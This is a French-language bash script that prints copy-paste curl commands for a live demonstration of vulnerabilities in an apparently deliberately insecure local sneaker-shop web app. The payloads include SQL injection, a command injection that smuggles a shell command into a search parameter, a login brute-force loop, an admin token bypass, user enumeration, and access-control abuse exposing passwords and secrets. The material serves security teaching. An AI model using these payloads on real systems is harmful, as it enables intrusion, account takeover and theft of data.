#!/bin/bash

# 🎬 Commandes pour la démonstration en direct
# Copier/coller chaque section pour montrer la faille

echo "═══════════════════════════════════════════════════════════════"
echo "SNEAKER SHOP - COMMANDS"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Avant de démarrer:"
echo "1. npm start (laisser tourner)"
echo "2. Ouvrir http://localhost:3000 dans un browser"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "0️⃣  FAILLE 0: SQL Injection (Vraie simulation)"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Étape 1: Se connecter"
echo ""
cat << 'EOF'
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'
EOF
echo ""
echo "Étape 2: Requête normale (voir ses propres commandes)"
echo ""
cat << 'EOF'
curl -b cookies.txt "http://localhost:3000/api/orders/search?userId=1"
EOF
echo ""
echo "Étape 3: SQL Injection (1 OR '1'='1' → toutes les commandes!)"
echo ""
cat << 'EOF'
curl -b cookies.txt "http://localhost:3000/api/orders/search?userId=1%20OR%20'1'%3D'1'"
EOF
echo ""
echo "→ Toutes les commandes de tous les users! La requête SQL est aussi exposée dans la réponse!"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "1️⃣  FAILLE 1: No Input Validation"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Copier/coller cette commande:"
echo ""
cat << 'EOF'
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"","email":"test@","password":"123"}'
EOF
echo ""
echo "→ La validation est faible ou absente"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "2️⃣  FAILLE 2: Plain Text Passwords"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Dans server.js, chercher: FAILLE 2"
echo ""
cat << 'EOF'
grep -n "FAILLE 2" server.js
EOF
echo ""
echo "Voir le password stocké en clair!"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "3️⃣  FAILLE 3: No Rate Limiting"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Envoyer 10 login rapidement (pas de throttling):"
echo ""
cat << 'EOF'
for i in {1..10}; do
  curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@sneakers.com","password":"try'$i'"}'
  echo ""
done
EOF
echo ""
echo "→ Toutes les requêtes passent! Brute force possible"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "4️⃣  FAILLE 4: Admin Bypass Token"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Étape 1: Voir le token dans .env"
echo ""
cat << 'EOF'
cat .env | grep ADMIN_TOKEN
EOF
echo ""
echo "Étape 2: L'utiliser pour bypasss le login"
echo ""
cat << 'EOF'
curl -X POST http://localhost:3000/api/login \
  -H "X-Admin-Token: admin_token_12345" \
  -H "Content-Type: application/json" \
  -d '{"email":"anyone@example.com","password":"anything"}'
EOF
echo ""
echo "→ SUCCESS! Accès admin sans bon password!"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "5️⃣  FAILLE 5: Unsafe Session Cookies"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Étape 1: Vérifier le code"
echo ""
cat << 'EOF'
grep -A 8 "cookie:" server.js
EOF
echo ""
echo "Points: secure=false, httpOnly=false"
echo ""
echo "Étape 2: Vérifier le cookie dans le browser"
echo ""
echo "- Ouvrir http://localhost:3000"
echo "- Login avec user@sneakers.com / user123"
echo "- Ouvrir DevTools → Console"
echo "- Taper: document.cookie"
echo "- Voir le sessionId en clair!"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "6️⃣  FAILLE 6: Information Disclosure"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Test 1: Email qui existe"
echo ""
cat << 'EOF'
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"wrong"}' | jq '.error'
EOF
echo ""
echo "→ Retourne: 'Wrong password' (user existe!)"
echo ""
echo "Test 2: Email qui n'existe pas"
echo ""
cat << 'EOF'
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@example.com","password":"anything"}' | jq '.error'
EOF
echo ""
echo "→ Retourne: 'User not found'"
echo ""
echo "→ Énumération d'utilisateurs possible!"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "7️⃣  FAILLE 7: BFLA (Broken Function Level Access)"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Étape 1: Login comme user normal"
echo ""
cat << 'EOF'
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'
EOF
echo ""
echo "Étape 2: Accéder au profil de l'admin (user id=2)"
echo ""
cat << 'EOF'
curl -b cookies.txt http://localhost:3000/api/user/2
EOF
echo ""
echo "→ Voir le profil COMPLET de l'admin incluant password!"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "8️⃣  FAILLE 8: Command Injection"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Prérequis: Être connecté (cookies.txt du test 7)"
echo ""
echo "Tester la command injection:"
echo ""
cat << 'EOF'
curl "http://localhost:3000/api/shoes/search?q=Nike;%20touch%20/tmp/pwned;%20echo" \
  -b cookies.txt

# Vérifier si le fichier a été créé
ls -la /tmp/pwned

# Supprimer le fichier
rm /tmp/pwned
EOF
echo ""
echo "→ FILE CREATED! Exécution de code arbitraire"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo " BONUS: Voir tous les secrets"
echo "═══════════════════════════════════════════════════════════════"
echo ""
cat << 'EOF'
curl http://localhost:3000/api/config
EOF
echo ""
echo "→ Tous les secrets exposés quand DEBUG = False!"
echo ""

# ═══════════════════════════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "✅ COMPLETE"
echo "═══════════════════════════════════════════════════════════════"
echo ""
